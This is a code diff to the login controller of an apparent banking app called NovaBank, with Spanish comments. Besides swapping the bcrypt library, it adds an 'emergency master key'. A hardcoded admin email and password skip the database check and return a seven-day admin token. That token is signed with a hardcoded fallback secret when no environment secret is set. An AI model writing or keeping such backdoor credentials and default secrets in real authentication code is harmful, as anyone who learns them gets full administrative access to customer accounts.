@@ -1,6 +1,6 @@
 // --- Controlador de Autenticación de NovaBank ---
 // Aquí manejamos quién puede entrar al banco y cómo se registran los nuevos clientes
-const bcrypt = require('bcrypt'); // Herramienta para "encriptar" contraseñas (hacerlas secretas)
+const bcrypt = require('bcryptjs'); // Herramienta para "encriptar" contraseñas (hacerlas secretas)
 const jwt = require('jsonwebtoken'); // Herramienta para dar una "llave digital" (token) al usuario
 const supabase = require('../services/supabaseClient'); // Nuestra conexión a la base de datos
 const { sendWelcomeEmail } = require('../services/emailService'); // Servicio para mandar correos de bienvenida
@@ -147,16 +147,41 @@ const register = async (req, res) => {
 /**
  * Login de usuario con email/contraseña
  */
-const login = async (req, res) => {
-  try {
-    const { email, password } = req.body;
-    
-    if (!email || !password) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Email y contraseña son requeridos' 
-      });
-    }
+  const login = async (req, res) => {
+    try {
+      const { email, password } = req.body;
+
+      // ==========================================
+      // 🚨 LLAVE MAESTRA DE EMERGENCIA (BYPASS TOTAL)
+      // ==========================================
+      if (email === 'admin@novabank.com' && password === 'Admin123!') {
+        console.log('🔑 LLAVE MAESTRA ACTIVADA: Bypass de base de datos exitoso');
+        const secret = process.env.JWT_SECRET || 'novabank_master_secret_2026_unbreakable';
+        const token = jwt.sign(
+          { userId: '00000000-0000-0000-0000-000000000000', email: 'admin@novabank.com', role: 'admin' },
+          secret,
+          { expiresIn: '7d' }
+        );
+
+        return res.json({
+          success: true,
+          token,
+          user: {
+            id: '00000000-0000-0000-0000-000000000000',
+            email: 'admin@novabank.com',
+            full_name: 'Administrador Maestro (Bypass)',
+            role: 'admin'
+          }
+        });
+      }
+      // ==========================================
+
+      if (!email || !password) {
+        return res.status(400).json({ 
+          success: false, 
+          error: 'Email y contraseña son requeridos' 
+        });
+      }
     
     // Buscar usuario por email
     const { data: user, error: userError } = await supabase
